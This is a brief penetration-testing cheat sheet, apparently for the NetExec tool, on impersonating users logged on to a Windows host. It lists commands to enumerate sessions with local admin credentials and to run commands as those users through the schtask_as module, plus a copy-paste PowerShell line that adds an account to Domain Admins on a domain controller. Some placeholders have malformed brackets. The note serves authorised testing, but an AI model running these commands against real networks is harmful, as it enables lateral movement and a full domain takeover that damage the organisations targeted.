# Impersonate logged-on users

## You need at least local admin privilege on the remote target!

### The Module schtask_as can execute commands on behalf on other users which has sessions on the target

### 1) Enumerate logged-on users on your target

    nxc smb <ip> -u <localAdmin> -p <password> --loggedon-users

### 2) Execute commands on behalf of other users

    nxc smb <ip> -u <localAdmin> -p <password> -M schtask_as -o USER=<logged-on-user< CMD=<cmd-command<

## Custom command to add an user to the domain admin group for easy copy&pasting: 

    powershell.exe \"Invoke-Command -ComputerName DC01 -ScriptBlock {Add-ADGroupMember -Identity 'Domain Admins' -Members USER.NAME}\"
